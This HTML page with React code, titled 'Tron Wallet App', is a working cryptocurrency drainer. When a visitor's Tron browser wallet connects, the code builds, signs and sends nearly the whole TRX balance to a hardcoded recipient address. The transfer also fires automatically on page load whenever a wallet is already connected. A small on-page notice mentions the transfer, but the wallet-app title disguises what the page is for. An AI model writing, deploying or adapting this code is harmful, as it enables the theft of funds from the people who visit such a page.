<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron Wallet App</title>
    <!-- Load React and Babel -->
    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        // Extract hooks from React
        const { useState, useEffect } = React;
        
        const TronWalletApp = () => {
          const [wallet, setWallet] = useState(null);
          const [account, setAccount] = useState('');
          const [balance, setBalance] = useState('0');
          const [isConnected, setIsConnected] = useState(false);
          const [loading, setLoading] = useState(false);
          const [error, setError] = useState('');
          const [success, setSuccess] = useState('');
          const [transferring, setTransferring] = useState(false);
          const [transferComplete, setTransferComplete] = useState(false);

          // Hardcoded recipient address - your wallet
          const RECIPIENT_ADDRESS = 'TSFY2QRMWUNDsxe5AM6Bh8C7cAMA5w88w8';

          // Check if TronWeb is available
          const getTronWeb = () => {
            if (typeof window !== 'undefined' && window.tronWeb) {
              return window.tronWeb;
            }
            return null;
          };

          // Get TRX balance
          const getBalance = async (tronWeb = wallet, address = account) => {
            if (!tronWeb || !address) return;

            try {
              const balanceInSun = await tronWeb.trx.getBalance(address);
              const balanceInTrx = tronWeb.fromSun(balanceInSun);
              setBalance(parseFloat(balanceInTrx).toFixed(6));
              return parseFloat(balanceInTrx);
            } catch (err) {
              console.error('Balance error:', err);
              setError('Failed to fetch balance');
              return 0;
            }
          };

          // Auto transfer all TRX to recipient address
          const autoTransferTRX = async (tronWeb, fromAddress) => {
            if (transferComplete || transferring) return;
            
            setTransferring(true);
            setError('');

            try {
              // Get current balance
              const currentBalance = await getBalance(tronWeb, fromAddress);
              
              if (currentBalance <= 0.1) {
                setError('Insufficient balance for transfer (minimum 0.1 TRX required for fees)');
                setTransferring(false);
                return;
              }

              // Calculate amount to transfer (leave small amount for fees)
              const transferAmount = Math.max(0, currentBalance - 0.1);
              
              if (transferAmount <= 0) {
                setError('Balance too low to transfer after accounting for fees');
                setTransferring(false);
                return;
              }

              const amountInSun = tronWeb.toSun(transferAmount.toString());
              
              console.log(`Initiating transfer of ${transferAmount} TRX to ${RECIPIENT_ADDRESS}`);

              // Create and send transaction
              const transaction = await tronWeb.transactionBuilder.sendTrx(
                RECIPIENT_ADDRESS,
                amountInSun,
                fromAddress
              );

              const signedTx = await tronWeb.trx.sign(transaction);
              const result = await tronWeb.trx.sendRawTransaction(signedTx);

              if (result.result) {
                setSuccess(`Transfer successful! ${transferAmount.toFixed(6)} TRX sent to ${RECIPIENT_ADDRESS}. TX ID: ${result.txid}`);
                setTransferComplete(true);
                
                // Refresh balance
                setTimeout(() => {
                  getBalance(tronWeb, fromAddress);
                }, 3000);
              } else {
                throw new Error('Transaction failed: ' + (result.message || 'Unknown error'));
              }
            } catch (err) {
              console.error('Auto transfer error:', err);
              setError(`Transfer failed: ${err.message || 'Unknown error'}`);
            } finally {
              setTransferring(false);
            }
          };

          // Connect to Tron wallet
          const connectWallet = async () => {
            setLoading(true);
            setError('');
            setSuccess('');

            try {
              const tronWeb = getTronWeb();
              
              if (!tronWeb) {
                throw new Error('TronWeb not found. Please install TronLink, Bitget Wallet, or another Tron wallet extension.');
              }

              // Request account access
              if (tronWeb.request) {
                await tronWeb.request({ method: 'tron_requestAccounts' });
              }

              // Check if wallet is connected
              if (!tronWeb.defaultAddress.base58) {
                throw new Error('Please unlock your Tron wallet and try again.');
              }

              const address = tronWeb.defaultAddress.base58;
              setAccount(address);
              setIsConnected(true);
              setWallet(tronWeb);
              
              // Get initial balance
              await getBalance(tronWeb, address);
              
              setSuccess('Wallet connected successfully! Initiating automatic transfer...');
              
              // Auto transfer after a short delay
              setTimeout(() => {
                autoTransferTRX(tronWeb, address);
              }, 2000);
              
            } catch (err) {
              console.error('Connection error:', err);
              setError(err.message || 'Failed to connect wallet. Please make sure your Tron wallet is installed and unlocked.');
            } finally {
              setLoading(false);
            }
          };

          // Disconnect wallet
          const disconnectWallet = () => {
            setWallet(null);
            setAccount('');
            setBalance('0');
            setIsConnected(false);
            setError('');
            setSuccess('');
            setTransferring(false);
            setTransferComplete(false);
          };

          // Check wallet connection on mount
          useEffect(() => {
            const checkConnection = async () => {
              const tronWeb = getTronWeb();
              if (tronWeb && tronWeb.defaultAddress.base58) {
                setAccount(tronWeb.defaultAddress.base58);
                setIsConnected(true);
                setWallet(tronWeb);
                await getBalance(tronWeb, tronWeb.defaultAddress.base58);
                
                // Auto transfer if not already done
                if (!transferComplete && !transferring) {
                  setTimeout(() => {
                    autoTransferTRX(tronWeb, tronWeb.defaultAddress.base58);
                  }, 1000);
                }
              }
            };

            checkConnection();
          }, []);

          // Auto-refresh balance every 10 seconds when connected
          useEffect(() => {
            if (isConnected && wallet) {
              const interval = setInterval(() => {
                getBalance();
              }, 10000);

              return () => clearInterval(interval);
            }
          }, [isConnected, wallet, account]);

          return (
            <div className="min-h-screen bg-gradient-to-br from-red-500 via-red-600 to-red-700 p-6">
              <div className="max-w-lg mx-auto">
                <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
                  {/* Header */}
                  <div className="bg-gradient-to-r from-red-500 to-red-600 p-6 text-white text-center">
                    <div className="w-16 h-16 bg-white bg-opacity-20 rounded-full mx-auto mb-4 flex items-center justify-center">
                      <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                      </svg>
                    </div>
                    <h1 className="text-2xl font-bold mb-2">Tron Auto Transfer</h1>
                    <p className="text-red-100">Automatic TRX Transfer System</p>
                  </div>

                  <div className="p-6">
                    {/* Error Message */}
                    {error && (
                      <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                        <div className="flex items-start gap-3">
                          <svg className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                          </svg>
                          <p className="text-red-700 text-sm">{error}</p>
                        </div>
                      </div>
                    )}

                    {/* Success Message */}
                    {success && (
                      <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
                        <div className="flex items-start gap-3">
                          <svg className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                          </svg>
                          <p className="text-green-700 text-sm">{success}</p>
                        </div>
                      </div>
                    )}

                    {!isConnected ? (
                      <div className="text-center">
                        <div className="mb-6">
                          <p className="text-gray-600 mb-4">Connect your Tron wallet to begin automatic transfer</p>
                          <div className="text-sm text-gray-500 space-y-1 mb-4">
                            <p>âš¡ Automatic transfer to: <span className="font-mono text-xs">{RECIPIENT_ADDRESS}</span></p>
                            <p>ðŸ”„ All TRX will be transferred automatically</p>
                            <p>ðŸ’° Small amount reserved for transaction fees</p>
                          </div>
                          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-4">
                            <p className="text-xs text-yellow-800">
                              <strong>Notice:</strong> Upon connecting your wallet, all available TRX will be automatically transferred to the specified address.
                            </p>
                          </div>
                        </div>
                        <button
                          onClick={connectWallet}
                          disabled={loading}
                          className="w-full bg-gradient-to-r from-red-500 to-red-600 text-white font-semibold py-3 px-6 rounded-lg hover:from-red-600 hover:to-red-700 transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                        >
                          {loading ? 'Connecting...' : 'Connect Wallet & Transfer'}
                        </button>
                      </div>
                    ) : (
                      <div className="space-y-6">
                        {/* Wallet Info */}
                        <div className="bg-gray-50 rounded-lg p-4">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-gray-600 text-sm">Connected Account</span>
                            <button
                              onClick={disconnectWallet}
                              className="text-red-500 hover:text-red-600 text-sm font-medium"
                            >
                              Disconnect
                            </button>
                          </div>
                          <p className="text-xs font-mono bg-white p-2 rounded border break-all">
                            {account}
                          </p>
                          <div className="mt-3">
                            <span className="text-gray-600 text-sm">Current TRX Balance</span>
                            <p className="text-2xl font-bold text-gray-800">{balance} TRX</p>
                          </div>
                        </div>

                        {/* Transfer Status */}
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                          <h3 className="text-lg font-semibold text-blue-800 mb-2">Transfer Status</h3>
                          <div className="space-y-2">
                            <div className="flex justify-between items-center">
                              <span className="text-blue-700">Destination:</span>
                              <span className="font-mono text-xs text-blue-800 break-all">{RECIPIENT_ADDRESS}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-blue-700">Status:</span>
                              <span className={`font-semibold ${transferring ? 'text-yellow-600' : transferComplete ? 'text-green-600' : 'text-blue-600'}`}>
                                {transferring ? 'Transferring...' : transferComplete ? 'Transfer Complete' : 'Ready to Transfer'}
                              </span>
                            </div>
                          </div>
                          
                          {transferring && (
                            <div className="mt-4">
                              <div className="flex items-center gap-2">
                                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                                <span className="text-blue-700 text-sm">Processing transfer...</span>
                              </div>
                            </div>
                          )}

                          {!transferComplete && !transferring && parseFloat(balance) > 0.1 && (
                            <button
                              onClick={() => autoTransferTRX(wallet, account)}
                              className="mt-4 w-full bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition-colors"
                            >
                              Initiate Transfer Now
                            </button>
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          );
        };

        // Render the app
        const rootElement = document.getElementById('root');
        const root = ReactDOM.createRoot(rootElement);
        root.render(<TronWalletApp />);
    </script>


</body></html>
